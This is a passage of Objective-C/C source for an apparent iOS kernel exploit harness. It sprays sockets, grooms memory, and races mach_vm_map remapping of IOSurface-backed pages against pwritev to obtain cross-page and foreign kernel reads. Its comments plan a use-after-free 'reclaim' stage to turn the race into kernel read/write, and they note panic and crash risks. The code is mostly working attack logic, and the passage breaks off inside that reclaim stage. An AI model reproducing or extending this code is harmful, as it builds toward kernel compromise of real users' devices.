                if (sscanf(ln0, "%llx", &v) == 1 && v && warmN < 512) rc_warm[warmN++] = v;
            }
            fclose(hf0);
        }
        rc_log("--- LightSword warm hot set: %u offsets from %@", warmN, srcName);
    }
    /* v11: merge the OTHER build's hot set (cross-app, read-only) */
    warmN = rc_hotsync_warm(rc_warm, warmN);
    rc_log("logfile: %s", [lp UTF8String]);
    rc_log("vm_page_size=0x%lx", vm_page_size);

    void *iosf = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    IOSurfaceCreate_t pCreate = (IOSurfaceCreate_t)dlsym(iosf, "IOSurfaceCreate");
    IOSurfaceGetBaseAddress_t pBase = (IOSurfaceGetBaseAddress_t)dlsym(iosf, "IOSurfaceGetBaseAddress");
    IOSurfacePrefetchPages_t pPrefetch = (IOSurfacePrefetchPages_t)dlsym(iosf, "IOSurfacePrefetchPages");
    if (!pCreate || !pBase) { rc_log("STOP no IOSurface"); goto done; }
    rc_log("IOSurfacePrefetchPages %s", pPrefetch ? "resolved" : "MISSING");

    uint64_t hmarker = ((uint64_t)arc4random() << 32) | arc4random();

    IOSurfaceRef surfBig = pCreate((__bridge CFDictionaryRef)@{ @"IOSurfaceAllocSize": @(0x8000), @"IOSurfaceMemoryRegion": @"PurpleGfxMem" });
    IOSurfaceRef surfSmall = pCreate((__bridge CFDictionaryRef)@{ @"IOSurfaceAllocSize": @(0x2000), @"IOSurfaceMemoryRegion": @"PurpleGfxMem" });
    if (!surfBig || !surfSmall) { rc_log("STOP surface create"); goto done; }

    /* Wire the IOSurface pages */
    if (pPrefetch) {
        pPrefetch(surfBig);
        pPrefetch(surfSmall);
        rc_log("prefetch OK on surfBig and surfSmall (wired)");
    }

    mach_port_t pcObjBig = 0, pcObjSmall = 0;
    mach_vm_address_t pcBig = 0, pcSmall = 0;
    mach_vm_size_t sz;
    kern_return_t kr;
    sz = 0x8000;
    kr = mach_make_memory_entry_64(mach_task_self(), &sz, (mach_vm_address_t)pBase(surfBig), VM_PROT_DEFAULT, &pcObjBig, 0);
    if (kr == KERN_SUCCESS)
        kr = mach_vm_map(mach_task_self(), &pcBig, 0x8000, 0, VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR, pcObjBig, 0, false, VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
    if (kr != KERN_SUCCESS) { rc_log("STOP pcBig 0x%x", kr); goto done; }
    sz = 0x2000;
    kr = mach_make_memory_entry_64(mach_task_self(), &sz, (mach_vm_address_t)pBase(surfSmall), VM_PROT_DEFAULT, &pcObjSmall, 0);
    if (kr == KERN_SUCCESS)
        kr = mach_vm_map(mach_task_self(), &pcSmall, 0x2000, 0, VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR, pcObjSmall, 0, false, VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
    if (kr != KERN_SUCCESS) { rc_log("STOP pcSmall 0x%x", kr); goto done; }

    /* v3 spray-tag knob: the guide's #1 experiment ("spray_tagged=false").
       knob "cscali" = "untagged" -> the fill becomes the per-boot random
       hmarker (never the a11a constant), so OWN pages can't be confused
       with the spray tag; anything foreign lands as an honest FOREIGN. */
    uint64_t m0;
    {
        /* 2026-11-19 PERMANENT PLAN — no knob files. The a11a constant is
           RETIRED (the bandit's own recommendation: a fixed mark confuses
           own pages). fill = the same-boot REAL heap anchor when one
           exists (p159 first), else the per-boot hmarker. The anchor is
           excluded from every shape classifier below. */
        int nAnc = LabHeapAnchorHarvestIfThin(1);   /* thin -> bounded p159 harvest (2x8 rounds) */
        g_rcAnchorN = LabHeapAnchorsSameBoot(4, g_rcAnchors);
        g_rcAnchor = g_rcAnchorN ? g_rcAnchors[0] : 0;
        m0 = g_rcAnchor ? g_rcAnchor : hmarker;
        g_rcUntagged = (g_rcAnchor == 0);   /* bandit-arm bookkeeping only */
        if (g_rcAnchorN > 1)
            rc_log("[anchor] multi set: %d distinct — m0=%#llx reclaim-vpat=%#llx",
                   g_rcAnchorN, g_rcAnchor, g_rcAnchors[1]);
        rc_log("[anchor] same-boot set: %d distinct%s", nAnc,
               nAnc ? "" : " (harvest produced none this boot)");
    }
    memset_pattern8((void *)pcBig, &m0, 0x8000);
    rc_log("pcBig=0x%llx M0_TAG=0x%llx spray=%s fill=0x%llx (page2 qword=0x%llx)",
           pcBig, M0_TAG,
           g_rcUntagged ? "UNTAGGED(hmarker)"
                        : (g_rcAnchor ? "anchor(same-boot REAL heap leak)" : "tagged(a11a)"),
           m0, *(uint64_t *)(pcBig + 0x4000));
    if (g_rcAnchor)
        rc_log("[anchor] m0 tag = same-boot heap leak 0x%llx — excluded from all kptr/FOREIGN classifiers (own-page measurement only)",
               g_rcAnchor);

    mach_vm_address_t searchMap = 0;
    mach_vm_size_t searchSize = 0x2000 * vm_page_size;
    uint32_t npages = (uint32_t)(searchSize / vm_page_size);
    kr = mach_vm_allocate(mach_task_self(), &searchMap, searchSize, VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR);
    if (kr != KERN_SUCCESS) { rc_log("STOP search alloc 0x%x", kr); goto done; }
    for (uint32_t i = 1; i < npages; i += 2) {
        uint64_t id = PAGE_ID(i);
        memset_pattern8((void *)(searchMap + (uint64_t)i * vm_page_size), &id, vm_page_size);
    }
    for (uint32_t i = 0; i < npages; i += 2) {
        uint64_t id = PAGE_ID(i);
        memset_pattern8((void *)(searchMap + (uint64_t)i * vm_page_size), &id, vm_page_size);
    }

    IOSurfaceRef lockSurf = NULL;
    if (pPrefetch) {
        CFMutableDictionaryRef props = CFDictionaryCreateMutable(kCFAllocatorDefault, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
        CFNumberRef aN = RCNUM((int64_t)searchMap);
        CFNumberRef sN = RCNUM((int64_t)searchSize);
        CFDictionarySetValue(props, CFSTR("IOSurfaceAddress"), aN);
        CFDictionarySetValue(props, CFSTR("IOSurfaceAllocSize"), sN);
        lockSurf = pCreate(props);
        CFRelease(aN); CFRelease(sN); CFRelease(props);
        if (lockSurf) {
            pPrefetch(lockSurf);
            rc_log("mlock/prefetch OK lockSurf=%p size=0x%llx", lockSurf, (uint64_t)searchSize);
        } else {
            rc_log("WARN IOSurfaceCreate(wrap searchMap) failed — running without mlock");
        }
    }

    mach_port_t searchObj = 0;
    sz = searchSize;
    kr = mach_make_memory_entry_64(mach_task_self(), &sz, searchMap, VM_PROT_DEFAULT, &searchObj, 0);
    if (kr != KERN_SUCCESS) { rc_log("STOP search entry 0x%x", kr); goto done; }

    mach_vm_address_t anonMap = 0;
    kr = mach_vm_allocate(mach_task_self(), &anonMap, 0x2000, VM_FLAGS_ANYWHERE);
    if (kr != KERN_SUCCESS) { rc_log("STOP anon 0x%x", kr); goto done; }
    memset((void *)anonMap, 0x41, 0x2000);
    mach_port_t anonObj = 0;
    sz = 0x2000;
    kr = mach_make_memory_entry_64(mach_task_self(), &sz, anonMap, VM_PROT_DEFAULT, &anonObj, 0);
    if (kr != KERN_SUCCESS) { rc_log("STOP anon entry 0x%x", kr); goto done; }

    char tmp[1024];
    confstr(_CS_DARWIN_USER_TEMP_DIR, tmp, sizeof(tmp));
    char pz[1100], pm[1100];
    snprintf(pz, sizeof(pz), "%s%u", tmp, arc4random());
    snprintf(pm, sizeof(pm), "%s%u", tmp, arc4random());
    uint8_t *zbuf = calloc(2, 0x8000);
    FILE *fp = fopen(pz, "w"); fwrite(zbuf, 1, 0x8000, fp); fclose(fp);
    fp = fopen(pm, "w"); fwrite(zbuf, 1, 0x8000, fp); fclose(fp);
    int fdZero = open(pz, O_RDWR);
    int fdMark = open(pm, O_RDWR);
    /* v3 fd-wall fix (the 12 receipts: H wFail=3000, debugger sockets=0):
       _CS_DARWIN_USER_TEMP_DIR can be denied in a fresh container and the
       code never checked. Fall back to Documents and name the failure. */
    if (fdZero < 0 || fdMark < 0) {
        rc_log("[scratch] DARWIN_TEMP open failed errno=%d (zero=%d mark=%d) — Documents fallback",
               errno, fdZero, fdMark);
        NSString *d2 = [NSSearchPathForDirectoriesInDomains(
            NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
        snprintf(pz, sizeof pz, "%s/z%u", [d2 fileSystemRepresentation], arc4random());
        snprintf(pm, sizeof pm, "%s/m%u", [d2 fileSystemRepresentation], arc4random());
        fp = fopen(pz, "w"); if (fp) { fwrite(zbuf, 1, 0x8000, fp); fclose(fp); }
        fp = fopen(pm, "w"); if (fp) { fwrite(zbuf, 1, 0x8000, fp); fclose(fp); }
        if (fdZero < 0) fdZero = open(pz, O_RDWR);
        if (fdMark < 0) fdMark = open(pm, O_RDWR);
        remove(pz); remove(pm);
        rc_log("[scratch] retry zero=%d mark=%d", fdZero, fdMark);
    }
    fcntl(fdZero, F_NOCACHE, 1);
    fcntl(fdMark, F_NOCACHE, 1);
    remove(pz); remove(pm);

    /* v12.1 fd-law: size the groom's holds to leave spray headroom */
    {
        struct rlimit rl;
        if (getrlimit(RLIMIT_NOFILE, &rl) == 0 && rl.rlim_cur > 2048)
            g_rcHoldCap = (uint32_t)(rl.rlim_cur - 2048 < RC_HOLD_MAX ?
                            (rl.rlim_cur - 2048) : RC_HOLD_MAX);
        else if (rl.rlim_cur > 0) g_rcHoldCap = rl.rlim_cur / 2;
        if (g_rc_log_fd >= 0)
            dprintf(g_rc_log_fd, "[groom] hold cap=%u (soft rlimit=%llu)\n",
                    g_rcHoldCap, (unsigned long long)rl.rlim_cur);
    }
    rc_started = 0; rc_go = 1; rc_raceOn = 0; rc_mapErr = 0;
    rc_swap_dead = 0; g_rcSwapRearmed = 0;
    rc_sprayGo = 1;
    rc_sprayAllocs = 0;
    rc_sprayFrees = 0;
    pthread_t th, thSpray;
    pthread_create(&th, NULL, rc_swap_thread, NULL);
    pthread_create(&thSpray, NULL, rc_socket_spray_thread, NULL); /* SOCKET SPRAY */
    rc_started = 1;
    rc_log("socket spray thread started (burst=%d, SOCK_DGRAM)", SOCK_SPRAY_BURST);

    {
        rc_log("--- H control ---");
        rc_mapAddr = pcSmall; rc_mapSize = 0x2000; rc_mapObj = anonObj; rc_mapOff = 0;
        struct iovec iov = { (void *)(pcSmall + 0x3f00), 0x4000 };
        uint64_t wFail = 0, hits = 0;
        for (int it = 0; it < RC_ITERS_H; it++) {
            mach_vm_address_t a = pcSmall;
            mach_vm_map(mach_task_self(), &a, 0x2000, 0, VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE, pcObjSmall, 0, false, VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
            *(uint64_t *)(pcSmall + 0x3f00) = hmarker;
            rc_raceOn = 1;
            ssize_t w = (ssize_t)rc_pwritev_bounded14(fdZero, iov.iov_base, iov.iov_len, 0x3f00, 5000);
            if (rc_raceOn_wait(5000) < 0) { rc_log("[H STALL] swap wedged >5 s (kernel) — H control aborted"); break; }
            if (w < 0) {   /* -1 = write failed; -2 = wedged >5 s (bounded miss) */
                wFail++;
                uint64_t rb = 0;
                (void)rc_fd_bounded(2, fdZero, &rb, 8, 0x3f00, 5000);
                if (rb != hmarker) hits++;
            }
        }
        rc_log("H: iters=%d wFail=%llu hits=%llu", RC_ITERS_H, wFail, hits);
    }

    rc_log("--- ID sweep delay=0 mlock=%s stride=%d tries=%d (ALL pwritev classified) ---",
           lockSurf ? "yes" : "no", RC_STRIDE, RC_TRIES);
    rc_log("--- spray active: sockets=%llu ---", rc_sprayAllocs);

    uint64_t rbBuf[RC_NQ];
    static const uint8_t zreset[0x1000] = {0};
    uint64_t nOff = 0, nOk = 0, nFail = 0;
    uint64_t okM0=0, okC=0, okW=0, okF=0, okZ=0, okP=0;
    uint64_t flM0=0, flC=0, flW=0, flF=0, flZ=0, flP=0;
    int dumped = 0;
    int failErrno[16] = {0};
    uint64_t rc_hotOffs[32]; uint32_t rc_hotN = 0;

    for (uint32_t start = 0; start + 1 < npages; start += RC_STRIDE) {
        if (rc_swap_dead) break;   /* 2026-11-19: kernel-side wedge — sweep over */
        mach_vm_offset_t off = (mach_vm_offset_t)start * vm_page_size;
        uint32_t expected = start + 1;
        rc_mapAddr = pcBig; rc_mapSize = 0x8000; rc_mapObj = searchObj; rc_mapOff = off;
        struct iovec iov = { (void *)(pcBig + 0x3f00), 0x4000 };
        nOff++;

        for (int it = 0; it < RC_TRIES; it++) {
            mach_vm_address_t a = pcBig;
            mach_vm_map(mach_task_self(), &a, 0x8000, 0, VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE, pcObjBig, 0, false, VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
            memset_pattern8((void *)pcBig, &m0, 0x8000);
            (void)rc_fd_bounded(1, fdMark, (void *)zreset, sizeof(zreset), 0x3f00, 5000);

            rc_raceOn = 1;
            ssize_t w = (ssize_t)rc_pwritev_bounded14(fdMark, iov.iov_base, iov.iov_len, 0x3f00, 5000);
            int e = (w == -1) ? rc_pwritev_errno_out14 : -1;   /* worker errno; -1 = no write/timeout */
            if (rc_raceOn_wait(5000) < 0) { rc_log("[ID STALL] swap wedged >5 s at off=0x%llx (kernel) — sweep aborted", (unsigned long long)off); break; }

            int isFail = (w < 0);
            if (isFail) {
                nFail++;
                if (e >= 0 && e < 16) failErrno[e]++;
            } else {
                nOk++;
            }

            (void)rc_fd_bounded(2, fdMark, rbBuf, sizeof(rbBuf), 0x4000, 5000);
            uint64_t got = 0; int32_t delta = 0;
            rc_cls_t c = rc_cls(rbBuf, expected, npages, &got, &delta);
            uint64_t *bM0 = isFail ? &flM0 : &okM0;
            uint64_t *bC  = isFail ? &flC  : &okC;
            uint64_t *bW  = isFail ? &flW  : &okW;
            uint64_t *bF  = isFail ? &flF  : &okF;
            uint64_t *bZ  = isFail ? &flZ  : &okZ;
            uint64_t *bP  = isFail ? &flP  : &okP;
            switch (c) {
                case C_M0: (*bM0)++; break;
                case C_CORRECT: (*bC)++; break;
                case C_WRONG:
                    (*bW)++;
                    if (dumped < 10) {
                        rc_log("  WRONG %s off=0x%llx expected=%u got=0x%llx delta=%d w=%zd",
                               isFail ? "FAIL" : "OK", (uint64_t)off, expected, got, delta, w);
                        dumped++;
                    }
                    rc_aim(rbBuf, c, fdMark, off, vm_page_size, hmarker);
                    break;
                case C_FOREIGN:
                    (*bF)++;
                    if (dumped < 10) {
                        rc_log("  FOREIGN %s off=0x%llx q0=0x%llx q1=0x%llx w=%zd",
                               isFail ? "FAIL" : "OK", (uint64_t)off, rbBuf[0], rbBuf[1], w);
                        dumped++;
                    }
                    rc_aim(rbBuf, c, fdMark, off, vm_page_size, hmarker);
                    break;
                case C_ZERO: (*bZ)++; break;
                case C_PARTIAL:
                    (*bP)++;
                    if (rc_hotN < 32) { int dup = 0; for (uint32_t hi = 0; hi < rc_hotN; hi++) if (rc_hotOffs[hi] == (uint64_t)off) { dup = 1; break; } if (!dup) rc_hotOffs[rc_hotN++] = (uint64_t)off; }
                    if (dumped < 6) {
                        rc_log("  PARTIAL %s off=0x%llx q0=0x%llx q1=0x%llx q-1=0x%llx w=%zd",
                               isFail ? "FAIL" : "OK", (uint64_t)off, rbBuf[0], rbBuf[1], rbBuf[RC_NQ-1], w);
                        dumped++;
                    }
                    rc_aim(rbBuf, c, fdMark, off, vm_page_size, hmarker);
                    break;
            }
        }
    }

    rc_log("offsets=%llu ok=%llu fail=%llu mapErr=%llu", nOff, nOk, nFail, rc_mapErr);
    rc_log("OK  : M0=%llu CORRECT=%llu WRONG=%llu FOREIGN=%llu ZERO=%llu PARTIAL=%llu",
           okM0, okC, okW, okF, okZ, okP);
    rc_log("FAIL: M0=%llu CORRECT=%llu WRONG=%llu FOREIGN=%llu ZERO=%llu PARTIAL=%llu",
           flM0, flC, flW, flF, flZ, flP);
    rc_log("spray totals: sockets=%llu", rc_sprayAllocs);
    for (int e = 0; e < 16; e++) if (failErrno[e]) rc_log("  errno %d count=%d", e, failErrno[e]);

    /* v10: persist this boot's hot offsets for future boots (dedup vs warm) */
    if (rc_hotN) {
        int hfd = g_hotPersistFd;
        if (hfd < 0) hfd = open(hotfile, O_WRONLY | O_CREAT | O_APPEND, 0644);
        if (hfd >= 0) {
            rc_log("[hotsync] local hot persist OK (%s)", hotfile);
            char l2[40];
            for (uint32_t i = 0; i < rc_hotN; i++) {
                int dup = 0;
                for (uint32_t k = 0; k < warmN; k++) if (rc_warm[k] == rc_hotOffs[i]) { dup = 1; break; }
                if (!dup) { int n2 = snprintf(l2, sizeof l2, "0x%llx\n", rc_hotOffs[i]); write(hfd, l2, (size_t)n2); }
            }
            close(hfd);
        } else {
            rc_log("[hotsync] local persist FAILED errno=%d", errno);
        }
    }

    /* ---- v10 HOT REPLAY (ID-sweep choreography, unsplit, spray STILL ON) ----
       Evidence 2026-10-24: boot A gave 6 PARTIAL in the ID sweep → v9 split-swap
       on 20 hots → 0 events of ANY class. Two differences conspired to close the
       window: (1) the SPLIT swap replaces the exact swap the window lives on,
       (2) v9 ran after pthread_join(spray) so the kalloc pressure that created
       the window was gone. v10 re-races the hot offsets with the EXACT ID-sweep
       recipe while the spray is still live, 200 tries each. Hot set = this
       boot's PARTIALs ∪ the persisted warm set. WRONG/FOREIGN = cskrw door;
       rising PARTIAL count = the window rate itself (the conversion signal). */
    {
        uint64_t hot[96]; uint32_t nHot = 0;
        for (uint32_t i = 0; i < rc_hotN && nHot < 96; i++) {
            int dup = 0;
            for (uint32_t k = 0; k < nHot; k++) if (hot[k] == rc_hotOffs[i]) { dup = 1; break; }
            if (!dup) hot[nHot++] = rc_hotOffs[i];
        }
        /* v11.1: warm NEWEST-first so the replay leads with fresh offsets */
        for (uint32_t ii = 0; ii < warmN && nHot < 96; ii++) {
            uint32_t i = warmN - 1 - ii;
            int dup = 0;
            for (uint32_t k = 0; k < nHot; k++) if (hot[k] == rc_warm[i]) { dup = 1; break; }
            if (!dup) hot[nHot++] = rc_warm[i];
        }
        rc_log("--- v10 HOT REPLAY: %u offsets (boot %u + warm %u), ID-sweep recipe x200, spray on ---",
               nHot, rc_hotN, warmN);
        uint64_t hw = 0, hf = 0, hp = 0; int hr2 = 0;
        for (uint32_t ho = 0; ho < nHot; ho++) {
            if (rc_swap_dead) break;
            uint64_t off = hot[ho];
            uint32_t pg = (uint32_t)(off / vm_page_size);
            for (int it2 = 0; it2 < 200; it2++) {
                mach_vm_address_t a = pcBig;
                mach_vm_map(mach_task_self(), &a, 0x8000, 0, VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE,
                            pcObjBig, 0, false, VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
                memset_pattern8((void *)pcBig, &m0, 0x8000);
                (void)rc_fd_bounded(1, fdMark, (void *)zreset, sizeof(zreset), 0x3f00, 5000);
                struct iovec iovH = { (void *)(pcBig + 0x3f00), 0x4000 };
                rc_mapAddr = pcBig; rc_mapSize = 0x8000; rc_mapObj = searchObj; rc_mapOff = (mach_vm_offset_t)off;
                rc_raceOn = 1;
                { int wH = rc_pwritev_bounded14(fdMark, iovH.iov_base, iovH.iov_len, 0x3f00, 5000); (void)wH; }
                if (rc_raceOn_wait(5000) < 0) { rc_log("[v10 STALL] swap wedged >5 s at hot 0x%llx (kernel) — tuner aborted", (unsigned long long)off); break; }
                (void)rc_fd_bounded(2, fdMark, rbBuf, sizeof(rbBuf), 0x4000, 5000);
                uint64_t got = 0; int32_t delta = 0;
                rc_cls_t c2 = rc_cls(rbBuf, pg + 1, npages, &got, &delta);
                if (c2 == C_WRONG) {
                    hw++;
                    if (hr2 < 8) {
                        rc_log("  v10 WRONG hot=0x%llx expected=%u delta=%d q0=0x%llx q1=0x%llx",
                               off, pg + 1, delta, rbBuf[0], rbBuf[1]);
                        hr2++;
                    }
                    int wfd = open(wrongfile, O_WRONLY | O_CREAT | O_APPEND, 0644);
                    if (wfd >= 0) {
                        char wl[48];
                        int n2 = snprintf(wl, sizeof wl, "0x%llx\n", (unsigned long long)off);
                        if (n2 > 0) write(wfd, wl, (size_t)n2);
                        close(wfd);
                    }
                }
                else if (c2 == C_FOREIGN) { hf++; if (hr2 < 8) { rc_log("  v10 FOREIGN hot=0x%llx q0=0x%llx q1=0x%llx", off, rbBuf[0], rbBuf[1]); hr2++; } }
                else if (c2 == C_PARTIAL) hp++;
            }
        }
        rc_log("v10 tuner: WRONG=%llu FOREIGN=%llu PARTIAL=%llu (boot %u + warm %u hots, ID-recipe x200)",
               hw, hf, hp, rc_hotN, warmN);
        /* v3 bandit hooks: the cscali domain's arm = which spray the tap
           used; FOREIGN>0 and WRONG>0 are the +0.5/+0.6-class outcomes */
        if (g_rcBanditInit == NO) {
            char attr[192];
            (void)LabBanditRegister("cscali",
                                    (const char *const[2]){ "tagged", "untagged" },
                                    2, NULL, 0,
                                    "cscali spray-tag arms (v3: untagged = the guide's #1)",
                                    "survived", "survived", attr, (int)sizeof attr);
            g_rcBanditInit = YES;
        }
        {
            char fs[16], ff[24];
            snprintf(fs, sizeof fs, "%s",
                     g_rcUntagged ? "untagged" : (g_rcAnchor ? "anchor" : "tagged"));
            snprintf(ff, sizeof ff, "0x%llx", (unsigned long long)m0);
            char fw[24], fh[24];
            snprintf(fw, sizeof fw, "%llu", (unsigned long long)hw);
            snprintf(fh, sizeof fh, "%llu", (unsigned long long)hf);
            LabBanditFeat fe[4] = { { "spray", fs }, { "fill", ff },
                                    { "wrong", fw }, { "foreign", fh } };
            LabBanditRecordFeat("cscali", g_rcUntagged ? 1 : 0,
                                hw ? LABB_SIG_SHAPE : "survived",
                                LABB_E_DEVICE, fe, 4);
            if (hf > 0) {
                char fh2[24];
                snprintf(fh2, sizeof fh2, "0x%llx", (unsigned long long)m0);
                LabBanditFeat fe2[1] = { { "fill", fh2 } };
                LabBanditRecordFeat("cscali", g_rcUntagged ? 1 : 0,
                                    LABB_SIG_FOREIGN, LABB_E_DEVICE, fe2, 1);
            }
        }
        if (hw) {
            rc_log("[v11] WRONG window converted on this boot: %llu cross-page copies "
                   "(delta-sampled above). Next stage = make the stale index point at a "
                   "page we freed and the kernel reused (reclaim stage). hasKread=NO.", hw);
        }
    }

    rc_go = 0; rc_raceOn = 1;
    rc_sprayGo = 0;
    pthread_join(th, NULL);
    pthread_join(thSpray, NULL);
    rc_raceOn = 0;   /* 2026-11-19: the swap thread exits with the flag stuck
                        at 1 — clear it or every post-sampler spin is dead */
    /* ---- v9 SPLIT-SAMPLER (secondary, spray OFF — kept as the NEGATIVE
       CONTROL after 10-24 evidence: 20 hot offsets → 0 events. It proves the
       window is schedule-shape-dependent, not a delay-sweep dial.) ---- */
    {
        rc_log("--- v9 split-sampler: %u hot offsets, split-swap delay sweep ---",
               rc_hotN);
        uint64_t hw=0, hf=0, hp=0, hr=0;
        const uint32_t offList[3] = { 0x3c00, 0x3e00, 0x3f00 };  /* boundary grain widths */
        for (uint32_t ho = 0; ho < rc_hotN; ho++) {
            uint64_t off = rc_hotOffs[ho];
            for (int g = 0; g < 3; g++) {
                for (uint32_t dl = 0; dl <= 8; dl++) {
                    useconds_t us = dl ? (1u << (dl - 1)) : 0;
                    mach_vm_address_t a = pcBig;
                    mach_vm_map(mach_task_self(), &a, 0x8000, 0, VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE,
                                pcObjBig, 0, false, VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
                    memset_pattern8((void *)pcBig, &m0, 0x8000);
                    (void)rc_fd_bounded(1, fdMark, (void *)zreset, sizeof(zreset), offList[g], 5000);
                    struct iovec iov2 = { (void *)(pcBig + offList[g]), 0x4000 };
                    rc_mapAddr = pcBig; rc_mapSize = 0x4000;  /* swap HALF */
                    rc_mapObj = searchObj; rc_mapOff = off;
                    rc_raceOn = 1;
                    (void)rc_pwritev_bounded14(fdMark, iov2.iov_base, iov2.iov_len, offList[g], 5000);
                    if (us) usleep(us);
                    mach_vm_address_t a2 = pcBig;   /* complete second half inline */
                    mach_vm_map(mach_task_self(), &a2, 0x8000, 0, VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE,
                                pcObjBig, 0, false, VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
                    rc_raceOn = 0;
                    (void)rc_fd_bounded(2, fdMark, rbBuf, sizeof(rbBuf), 0x4000, 5000);
                    uint64_t got = 0; int32_t delta = 0;
                    rc_cls_t cc = rc_cls(rbBuf, 0, npages, &got, &delta);
                    if (cc == C_WRONG) { hw++; if (hr < 8) { rc_log("  v9 WRONG hot=0x%llx g=0x%x us=%u q0=0x%llx q1=0x%llx", off, offList[g], us, rbBuf[0], rbBuf[1]); hr++; } }
                    else if (cc == C_FOREIGN) { hf++; if (hr < 8) { rc_log("  v9 FOREIGN hot=0x%llx g=0x%x us=%u q0=0x%llx q1=0x%llx", off, offList[g], us, rbBuf[0], rbBuf[1]); hr++; } }
                    else if (cc == C_PARTIAL) hp++;
                    else hr += 0;
                }
            }
        }
        rc_log("v9 split-sampler: WRONG=%llu FOREIGN=%llu PARTIAL=%llu (negative control)",
               hw, hf, hp);
    }

        /* knob triage (calib): knob "v12" runs the whole-surface stage only;
           knob "v12.2" runs the mlock stage only; knob "v13" runs ONLY the
           purgeable feed (v12's stall at pre-write never reaches it);
           knob "v14" runs ONLY the cs2-order spray-then-reread stage;
           unset/other runs both v12 stages */
        /* 2026-11-19 PERMANENT PLAN — no knob files, no auto rotation.
           Receipts that killed the old machinery: v13 CRASHED the main
           app (purgeable-trap class); the knob/auto picker could hand a
           fresh install the crash stage unprompted. Default tap =
           H control + ID sweep + v10 hot replay + v14 reclaim only.
           The lab stages stay reachable ONLY behind explicit arm files
           (presence gates, no content parsing — the lswkrw_arm law):
             Documents/cscalib_v12_arm.txt  -> v12 whole-surface + v12.2
                                              (the pre-write stall class,
                                              now fully bounded)
             Documents/cscalib_v13_arm.txt  -> v13 purgeable feed
                                              (CRASH class: solo tap,
                                              fresh boot, expect the .ips)
        */
        BOOL g_runWhole = NO, g_runMlock = NO, g_runV13 = NO, g_runV14 = YES;
        {
            NSString *docs = [NSSearchPathForDirectoriesInDomains(
                NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
            NSFileManager *fm = [NSFileManager defaultManager];
            if ([fm fileExistsAtPath:[docs stringByAppendingPathComponent:@"cscalib_v12_arm.txt"]]) {
                g_runWhole = YES; g_runMlock = YES;
                rc_log("[calib] cscalib_v12_arm.txt present — v12/v12.2 lab stages ARMED (bounded)");
            }
            if ([fm fileExistsAtPath:[docs stringByAppendingPathComponent:@"cscalib_v13_arm.txt"]]) {
                g_runV13 = YES;
                rc_log("[calib] cscalib_v13_arm.txt present — v13 purgeable stage ARMED (CRASH class; solo tap, fresh boot)");
            }
        }
        rc_log("[calib] FIXED plan=%s%s%s%s (no knob files)",
               g_runWhole ? "v12 " : "", g_runMlock ? "v12.2 " : "",
               g_runV13 ? "v13 " : "", g_runV14 ? "v14 " : "");
    /* 2026-11-19 pre-write freeze fix (root cause): v12 / v12.2 / v13 /
       v14 all race via rc_raceOn, but the swap thread was joined at the
       v9 boundary — the flag stuck at 1 and the first post-sampler
       "pre-write" spin froze the tap forever. Re-arm the swap thread for
       the racing stages; the tail joins it before teardown. */
    if (g_runWhole || g_runMlock || g_runV13 || g_runV14) {
        rc_go = 1;
        if (pthread_create(&th, NULL, rc_swap_thread, NULL) == 0) {
            g_rcSwapRearmed = 1;
            rc_log("[calib] swap thread re-armed for the racing stages");
        } else {
            rc_go = 0;
            rc_log("[calib STOP] swap re-arm failed — racing stages skipped");
            g_runWhole = NO; g_runMlock = NO; g_runV13 = NO; g_runV14 = NO;
        }
    }
    /* ---- v12 RECLAIM: free our page, let the kernel reuse it, re-race
       the same stale index. FOREIGN content in the window = real kread.
       PANIC-POSSIBLE (UAF-class by construction); solo tap, one per
       force-quit; nothing in the existing race bodies is altered. */
    if (g_runWhole) {
        IOSurfaceRef reSurf = pCreate((__bridge CFDictionaryRef)@{
            @"IOSurfaceAllocSize": @(0x8000),
            @"IOSurfaceMemoryRegion": @"PurpleGfxMem" });
        if (!reSurf) { rc_log("[v12] surf create fail — stage skipped"); }
        else {
            mach_vm_size_t rsz = 0x8000;
            mach_port_t reObj = 0; mach_vm_address_t reMap = 0;
            kr = mach_make_memory_entry_64(mach_task_self(), &rsz,
                (mach_vm_address_t)pBase(reSurf), VM_PROT_DEFAULT, &reObj, 0);
            if (kr == KERN_SUCCESS)
                kr = mach_vm_map(mach_task_self(), &reMap, 0x8000, 0,
                    VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR, reObj, 0, false,
                    VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
            if (kr != KERN_SUCCESS) {
                rc_log("[v12] entry/map 0x%x — stage skipped", kr);
                CFRelease(reSurf);
            } else {
                /* fingerprint fill; after release, a post-race window still
                   carrying rfill proves the page was NOT reused (honest
                   negative), anything else foreign-class is the hit */
                static uint64_t rfill = 0, rfill2 = 0;
                rfill  = ((uint64_t)arc4random() << 32) | arc4random();
                rfill2 = ~rfill;
                uint64_t rfillArr[2] = { rfill, rfill2 };
                for (uint32_t wi = 0; wi < 0x8000 / 16; wi++) {
                    uint64_t *w = (uint64_t *)reMap + wi * 2;
                    w[0] = rfill; w[1] = rfill2;
                }
                rc_log("--- v12 RECLAIM: create->fingerprint(0x%016llx)->release->"
                       "re-race (PANIC-POSSIBLE) ---",
                       (unsigned long long)rfill);
                /* RELEASE: the kernel backing of reSurf returns its pages
                   to the free pool (CFRelease drops the last ref; the
                   fingerprint pages are now reclaimable kernel memory).
                   v12.1 ordering law (the 12 stall receipt: the re-race's
                   first pwritev never returned while OUR alias lived over
